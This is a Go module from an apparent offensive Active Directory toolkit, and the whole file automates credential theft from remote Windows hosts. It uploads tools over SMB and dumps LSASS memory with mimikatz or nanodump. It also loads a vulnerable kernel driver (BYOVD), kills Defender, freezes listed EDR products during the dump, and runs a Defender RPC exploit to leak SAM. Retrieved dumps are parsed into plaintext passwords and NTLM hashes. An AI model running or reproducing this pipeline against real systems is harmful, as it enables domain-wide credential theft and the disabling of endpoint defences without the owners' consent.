package modules

import (
	"context"
	"adpack/core"
	"adpack/tools"
	"adpack/utils"
	"fmt"
	"strings"
	"time"
	"unicode"
)

var acquisitionPipelines = map[string]PipelineDef{
	"minimal": {
		Name:        "minimal",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		ParseFn:     parseMimikatzOutput,
		Description: "Donut-wrap go-mimikatz and execute via NetExec SMB on target",
	},
	"standard": {
		Name:        "standard",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Donut-wrap go-mimikatz, upload via SMB, execute via WMI/WinRM, retrieve output",
	},
	"aggressive": {
		Name:        "aggressive",
		Delivery:    "bof",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload nanodump via SMB, execute with --fork, retrieve and parse dump",
	},
	"bof": {
		Name:        "bof",
		Delivery:    "bof",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "BOF-based nanodump via C2 agent (requires active agent on target)",
	},
	"fork": {
		Name:        "fork",
		Delivery:    "exe",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload nanodump.exe via SMB, execute with --fork (clone LSASS), retrieve dump",
	},
	"byovd": {
		Name:        "byovd",
		Delivery:    "exe",
		PayloadType: "byovd",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload RTCore64.sys + dump tool via SMB, load driver, patch LSASS PPL, dump",
	},
	"coldwer": {
		Name:        "coldwer",
		Delivery:    "exe",
		PayloadType: "coldwer",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload EDR-Freeze.exe + nanodump.exe via SMB, freeze EDR for 3s, dump LSASS",
	},
	"undefend": {
		Name:        "undefend",
		Delivery:    "exe",
		PayloadType: "undefend",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload UnDefend.exe + nanodump.exe, kill Defender, fork dump LSASS",
	},
	"bluehammer": {
		Name:        "bluehammer",
		Delivery:    "exe",
		PayloadType: "bluehammer",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Upload FunnyApp.exe, exploit Defender RPC to leak SAM via VSS, extract hashes",
	},
}

type PipelineDef struct {
	Name        string
	Delivery    string
	PayloadType string
	RemoteExec  bool
	ParseFn     func(string) []core.Credential
	Description string
}

func RunCredentialAcq(state *core.ADState, profileName string, targetHost string) *core.ToolResult {
	profile, ok := LookupProfile(profileName)
	if !ok {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "evasion", Key: "error",
				Value: fmt.Sprintf("unknown profile: %s", profileName),
			}},
		}
	}

	pipeline, ok := acquisitionPipelines[profileName]
	if !ok {
		pipeline = acquisitionPipelines["standard"]
	}

	fmt.Printf("[*] Using evasion profile: %s (%s)\n", profile.Name, profile.Description)

	host, found := selectTarget(state, targetHost)
	if !found {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "credential_acq", Key: "target", Value: "none",
				Confidence: 0, Timestamp: time.Now(),
			}},
		}
	}

	fmt.Printf("[*] Target: %s (%s)\n", host.IP, host.Hostname)

	switch profileName {
	case "minimal":
		return executeMimikatzPipeline(state, host, pipeline)
	case "standard":
		return executeMimikatzPipeline(state, host, pipeline)
	case "aggressive", "bof", "fork":
		return executeNanodumpPipeline(state, host, pipeline)
	case "byovd":
		return executeBYOVDPipeline(state, host, pipeline)
	case "coldwer":
		return executeColdWerPipeline(state, host, pipeline)
	case "undefend":
		return executeUnDefendPipeline(state, host, pipeline)
	case "bluehammer":
		return executeBlueHammerPipeline(state, host, pipeline)
	default:
		return executeMimikatzPipeline(state, host, pipeline)
	}
}

func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
	if preferred != "" {
		for _, h := range state.Hosts {
			if h.IP == preferred || h.Hostname == preferred {
				return h, true
			}
		}
	}
	if len(state.Hosts) > 0 {
		for _, h := range state.Hosts {
			if h.IsDC {
				return h, true
			}
		}
		return state.Hosts[0], true
	}
	return core.Host{}, false
}

func getCredential(state *core.ADState) (string, string, string, string) {
	for _, c := range state.Creds {
		if c.Validated && c.Domain != "" && c.Username != "" {
			return c.Domain, c.Username, c.Secret, c.Hash
		}
	}
	for _, c := range state.Creds {
		if c.Domain != "" && c.Username != "" {
			return c.Domain, c.Username, c.Secret, c.Hash
		}
	}
	return "", "", "", ""
}

func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, _ := getCredential(state)

	if !tools.GoMimikatz.Available() {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "go-mimikatz", Key: "status", Value: "tool not available",
		})
		result.Success = false
		return result
	}

	mcfg := tools.DefaultGoMimikatzConfig()

	ctx := context.Background()

	if pipeline.RemoteExec && domain != "" && pass != "" {
		fmt.Printf("[*] Remote exec go-mimikatz on %s via NetExec...\n", host.IP)
		target := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass,
		}
		safeCmd := sanitizeMimikatzCommand(mcfg.Command)
		r, err := tools.NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf("go-mimikatz %s", safeCmd)})
		if err == nil && r.Success {
			creds := pipeline.ParseFn(r.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
					Timestamp: time.Now(),
				})
			}
		} else {
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "go-mimikatz", Key: "error",
				Value: "remote execution failed",
				Timestamp: time.Now(),
			})
		}
		return result
	}

	fmt.Println("[*] Running go-mimikatz locally...")
	r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
	if err == nil && r.Success {
		creds := pipeline.ParseFn(r.Stdout)
		result.Creds = append(result.Creds, creds...)
		for _, c := range creds {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
				Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
				Timestamp: time.Now(),
			})
		}
	}
	result.RawOutput = r.Stdout
	return result
}

func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if !tools.Nanodump.Available() {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "nanodump", Key: "status", Value: "tool not available",
		})
		result.Success = false
		return result
	}

	ncfg := tools.NanodumpConfig{
		Binary:   "nanodump",
		Output:   fmt.Sprintf("/tmp/lsass_%d.dmp", time.Now().Unix()),
		Fork:     true,
		Snapshot: false,
	}

	ctx := context.Background()

	if pipeline.RemoteExec && domain != "" && pass != "" {
		fmt.Printf("[*] Remote nanodump on %s via NetExec SMB...\n", host.IP)
		target := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass, Hash: hash,
		}

		remotePath := fmt.Sprintf(`C:\Windows\Temp\lsass_%d.dmp`, time.Now().Unix())
		ncfg.Output = remotePath

		cmd := fmt.Sprintf("nanodump --write %s --fork", remotePath)
		r, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
		if err != nil || !r.Success {
			fmt.Printf("[!] Remote execution failed: %s\n", r.Stderr)
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "nanodump", Key: "error",
				Value: "remote execution failed",
				Timestamp: time.Now(),
			})
			return result
		}

		fmt.Println("[*] Retrieving dump via SMB...")
		getCmd := fmt.Sprintf(`--get-file %s`, remotePath)
		getTarget := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass, Hash: hash,
		}
		getR, err := tools.NetExec.Run(ctx, getTarget, getCmd, []string{})
		if err == nil && getR.Success {
			localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
			fmt.Printf("[*] Parsing dump with pypykatz...\n")
			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
			if err != nil {
				pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
				if pyr.Success {
					creds := pipeline.ParseFn(pyr.Stdout)
					result.Creds = append(result.Creds, creds...)
				}
			} else if parsed.Success {
				creds := pipeline.ParseFn(parsed.Stdout)
				result.Creds = append(result.Creds, creds...)
			}
		}
		return result
	}

	fmt.Println("[*] Running nanodump locally...")
	r, err := tools.Nanodump.Run(ctx, tools.ExecutionRequest{
		Evasion: "fork",
	})
	if err == nil && r.Success {
		parsed, err := tools.Nanodump.ParseDump(ctx, ncfg.Output)
		if err == nil && parsed.Success {
			creds := pipeline.ParseFn(parsed.Stdout)
			result.Creds = append(result.Creds, creds...)
		}
	}
	result.RawOutput = r.Stdout
	return result
}

func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for BYOVD pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error",
			Value: "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	fmt.Println("[*] BYOVD: Uploading RTCore64.sys to target...")
	ctx := context.Background()
	uploadDrv, err := tools.NetExec.PutFile(ctx, target, "RTCore64.sys", `C:\Windows\Temp\`)
	if err != nil || !uploadDrv.Success {
		fmt.Println("[!] Failed to upload RTCore64.sys")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error",
			Value: "failed to upload RTCore64.sys",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Uploading nanodump.exe to target...")
	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
	if err != nil || !uploadNd.Success {
		fmt.Println("[!] Failed to upload nanodump.exe")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error",
			Value: "failed to upload nanodump.exe",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Loading driver...")
	loadDrv, err := tools.NetExec.Run(ctx, target, "-x", []string{
		`sc create RTCore64 binPath=C:\Windows\Temp\RTCore64.sys type=kernel && sc start RTCore64`,
	})
	if err != nil || !loadDrv.Success {
		fmt.Println("[!] Driver load failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error",
			Value: "driver load failed",
			Timestamp: time.Now(),
		})
		return result
	}

	defer func() {
		tools.NetExec.Run(ctx, target, "-x", []string{
			`sc stop RTCore64 && sc delete RTCore64`,
		})
	}()

	fmt.Println("[*] BYOVD: Dumping LSASS...")
	dumpCmd := `C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_byovd.dmp --fork`
	dump, err := tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
	if err != nil || !dump.Success {
		fmt.Println("[!] Dump failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error",
			Value: "dump failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Retrieving dump...")
	getR, err := tools.NetExec.GetFile(ctx, target, `C:\Windows\Temp\lsass_byovd.dmp`, ".")
	if err == nil && getR.Success {
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", "lsass_byovd.dmp")
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "byovd", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.85, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}

	fmt.Println("[*] BYOVD: Stopping driver...")
	tools.NetExec.Run(ctx, target, "-x", []string{
		`sc stop RTCore64 && sc delete RTCore64`,
	})
	return result
}

func runDefenderKill(state *core.ADState, host core.Host, target tools.NetExecTarget) {
	if !tools.UnDefend.Available() {
		fmt.Println("[!] UnDefend.exe not found locally, skipping Defender kill")
		return
	}
	ctx := context.Background()
	fmt.Println("[*] Pre-condition: Uploading UnDefend.exe to target...")
	upload, err := tools.NetExec.PutFile(ctx, target, "UnDefend.exe", `C:\Windows\Temp\`)
	if err != nil || !upload.Success {
		fmt.Println("[!] Failed to upload UnDefend.exe, skipping Defender kill")
		return
	}
	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode to kill Defender...")
	killR, _ := tools.UnDefend.ExecRemote(ctx, target, `C:\Windows\Temp\UnDefend.exe`, tools.UnDefendAggressive)
	_ = killR
	time.Sleep(2 * time.Second)
}

func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for UnDefend pipeline, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	runDefenderKill(state, host, target)

	ctx := context.Background()
	fmt.Println("[*] UnDefend: Uploading nanodump.exe to target...")
	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
	if err != nil || !uploadNd.Success {
		fmt.Println("[!] Failed to upload nanodump.exe")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "undefend", Key: "error",
			Value: "failed to upload nanodump.exe",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] UnDefend: Dumping LSASS via nanodump --fork...")
	dumpCmd := `C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_undefend.dmp --fork`
	dump, err := tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
	if err != nil || !dump.Success {
		fmt.Println("[!] Dump failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "undefend", Key: "error",
			Value: "dump failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] UnDefend: Retrieving dump...")
	getR, err := tools.NetExec.GetFile(ctx, target, `C:\Windows\Temp\lsass_undefend.dmp`, ".")
	if err == nil && getR.Success {
		fmt.Println("[*] UnDefend: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", "lsass_undefend.dmp")
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "undefend", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}
	return result
}

func executeBlueHammerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for BlueHammer pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "error",
			Value: "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	if !tools.BlueHammer.Available() {
		fmt.Println("[!] FunnyApp.exe (BlueHammer) not available, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	fmt.Println("[*] BlueHammer: Uploading FunnyApp.exe to target...")
	ctx := context.Background()
	upload, err := tools.NetExec.PutFile(ctx, target, "FunnyApp.exe", `C:\Windows\Temp\`)
	if err != nil || !upload.Success {
		fmt.Println("[!] Failed to upload FunnyApp.exe")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "error",
			Value: "failed to upload FunnyApp.exe",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BlueHammer: Executing Defender RPC exploit to leak SAM...")
	execR, err := tools.BlueHammer.ExecRemote(ctx, target, `C:\Windows\Temp\FunnyApp.exe`)
	if err == nil && execR.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "sam_leak",
			Value: "BlueHammer executed. Check target for SAM output.",
			Confidence: 0.5, RawOutput: execR.Stdout,
			Timestamp: time.Now(),
		})
	}
	return result
}

func executeColdWerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for ColdWer pipeline, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	_ = hash

	runDefenderKill(state, host, target)

	ctx := context.Background()
	fmt.Println("[*] ColdWer: Uploading EDR-Freeze.exe + nanodump.exe to target...")
	uploadFrz, err := tools.NetExec.PutFile(ctx, target, "EDR-Freeze.exe", `C:\Windows\Temp\`)
	if err != nil || !uploadFrz.Success {
		fmt.Println("[!] Failed to upload EDR-Freeze.exe, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}
	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
	if err != nil || !uploadNd.Success {
		fmt.Println("[!] Failed to upload nanodump.exe")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "coldwer", Key: "error",
			Value: "failed to upload nanodump.exe",
			Timestamp: time.Now(),
		})
		return result
	}

	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
		"Cylance.exe", "Sophos.exe", "TaniumClient.exe", "S1.exe"}

	for _, proc := range edrProcs {
		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
		pidR, err := tools.NetExec.Run(ctx, target, "-x", []string{pidCmd})
		if err == nil && pidR.Success && strings.TrimSpace(pidR.Stdout) != "" {
			pid := strings.TrimSpace(pidR.Stdout)
			if !isNumeric(pid) {
				fmt.Printf("[!] Invalid PID from remote: %q, skipping\n", pid)
				continue
			}
			fmt.Printf("[*] ColdWer: Found %s PID %s, freezing for 3s...\n", proc, pid)
			freezeCmd := fmt.Sprintf(`C:\Windows\Temp\EDR-Freeze.exe %s 3000`, pid)
			freeze, err := tools.NetExec.Run(ctx, target, "-x", []string{freezeCmd})
			if err == nil && freeze.Success {
				time.Sleep(1 * time.Second)
				fmt.Println("[*] ColdWer: Dumping LSASS during freeze window...")
				dumpCmd := `C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_frozen.dmp --fork`
				tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
				break
			}
		}
	}

	getR, err := tools.NetExec.GetFile(ctx, target, `C:\Windows\Temp\lsass_frozen.dmp`, ".")
	if err == nil && getR.Success {
		fmt.Println("[*] ColdWer: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", "lsass_frozen.dmp")
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "coldwer", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	} else {
		fmt.Println("[!] No frozen dump retrieved, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}
	return result
}

func parseMimikatzOutput(output string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	var currentUser, currentDomain string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)

		if strings.Contains(lower, "username") && !strings.Contains(lower, "password") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					currentUser = val
				}
			}
		}
		if strings.Contains(lower, "domain") && !strings.Contains(lower, "domain sid") &&
			!strings.Contains(lower, "domain server") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					currentDomain = strings.TrimSpace(strings.Split(val, " ")[0])
				}
			}
		}
		if strings.Contains(lower, "password") && !strings.Contains(lower, "password last") &&
			!strings.Contains(lower, "password never") && !strings.Contains(lower, "password required") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					creds = append(creds, core.Credential{
						Type: core.CredPlaintext, Username: currentUser,
						Domain: currentDomain, Secret: val, Source: "go-mimikatz",
					})
				}
			}
		}
	}
	return dedupCreds(creds)
}

func parseNanodumpOutput(output string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	var currentUser, currentDomain string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)

		if strings.Contains(lower, "username") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentUser = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "domainname") || strings.Contains(lower, "domain name") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentDomain = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "ntlm") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				hash := strings.TrimSpace(parts[1])
				if len(hash) == 32 {
					creds = append(creds, core.Credential{
						Type: core.CredHash, Username: currentUser,
						Domain: currentDomain, Hash: hash, Source: "nanodump",
					})
				}
			}
		}
	}
	return dedupCreds(creds)
}

func dedupCreds(creds []core.Credential) []core.Credential {
	seen := make(map[string]bool)
	var unique []core.Credential
	for _, c := range creds {
		key := c.Domain + "\\" + c.Username + ":" + c.Secret + c.Hash
		if !seen[key] {
			seen[key] = true
			unique = append(unique, c)
		}
	}
	return unique
}

func sanitizeMimikatzCommand(cmd string) string {
	var safe []rune
	for _, r := range cmd {
		if unicode.IsLetter(r) || unicode.IsDigit(r) || r == ':' || r == ' ' || r == '_' || r == '-' {
			safe = append(safe, r)
		}
	}
	return string(safe)
}

func isNumeric(s string) bool {
	for _, r := range s {
		if !unicode.IsDigit(r) {
			return false
		}
	}
	return s != ""
}
